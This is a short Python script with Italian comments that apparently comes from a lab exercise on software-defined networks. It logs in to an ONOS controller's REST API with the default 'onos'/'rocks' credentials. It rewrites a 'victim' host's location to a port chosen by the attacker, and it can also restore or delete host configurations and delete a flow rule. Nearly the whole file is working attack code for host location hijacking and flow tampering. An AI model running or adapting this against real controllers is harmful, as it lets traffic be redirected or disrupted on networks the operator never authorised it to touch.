#!/usr/bin/python3
import requests
from requests.auth import HTTPBasicAuth


"""-------------------- Sezione costanti variabili di utilità --------------------"""


ONOS_USERNAME = "onos"
ONOS_PASSWORD = "rocks"

url_configurazione_hosts = "http://172.17.0.2:8181/onos/v1/network/configuration/hosts/"


mac_ips = {"00:00:00:00:00:01": "10.0.0.1", "00:00:00:00:00:03": "10.0.0.3", "00:00:00:00:00:02": "10.0.0.2"}
locations = ["of:0000000000000001/1", "of:0000000000000002/3"]


"""-------------------- Fine sezione costanti e variabili di utilità --------------------"""

"""-------------------- Sezione metodi di utilità --------------------"""

# Sostituisce la location dell'host vittima con quella desiderata dall'attaccante
def scambia_location(mac):
    payload_hosts = {
        f"{mac}/None": {
            "basic": {
                "ips": [mac_ips[mac]],
                "locations": ["of:0000000000000002/2"]
            }
        }
    }

    risposta = requests.post(url_configurazione_hosts, auth=HTTPBasicAuth(ONOS_USERNAME, ONOS_PASSWORD),
                             headers={'Content-Type': 'application/json'}, json=payload_hosts)

    if risposta.status_code == 200:
        print(f"La location di {mac_ips[mac]} è stata modificata\n")

# Ripristina la location dell'host vittima, rimettendolo sulla porta dello switch originaria
def ripristina_location(mac):
    posizione_locations = list(mac_ips.keys()).index(mac)

    payload_hosts = {
        f"{mac}/None": {
            "basic": {
                "ips": [mac_ips[mac]],
                "locations": [locations[posizione_locations]]
            }
        }
    }
    risposta = requests.post(url_configurazione_hosts, auth=HTTPBasicAuth(ONOS_USERNAME, ONOS_PASSWORD),
                             headers={'Content-Type': 'application/json'}, json=payload_hosts)
    if risposta.status_code == 200:
        print(f"La location di {mac_ips[mac]} è stata ripristinata\n")

# Elimina ogni configurazione di rete aggiunta
def elimina_hosts():
    # Cancella Configurazioni di rete (Hosts, Links, Devices etc)
    url_hosts_alt = "http://172.17.0.2:8181/onos/v1/network/configuration/hosts/"
    risposta = requests.delete(url_hosts_alt, auth=HTTPBasicAuth(ONOS_USERNAME, ONOS_PASSWORD))

    if risposta.status_code == 204:
        print(f"La topologia è stata ripristinata\n")


"""-------------------- Fine sezione metodi di utilità --------------------"""


if __name__ == "__main__":
    # scambia_location("00:00:00:00:00:03")
    # ripristina_location("00:00:00:00:00:03")
    # elimina_hosts()
    delete_response = requests.delete(f'http://172.17.0.2:8181/onos/v1/flows/of:0000000000000002/51791397577949992',
                                      auth=HTTPBasicAuth("onos", "rocks"))
    print(delete_response.status_code)
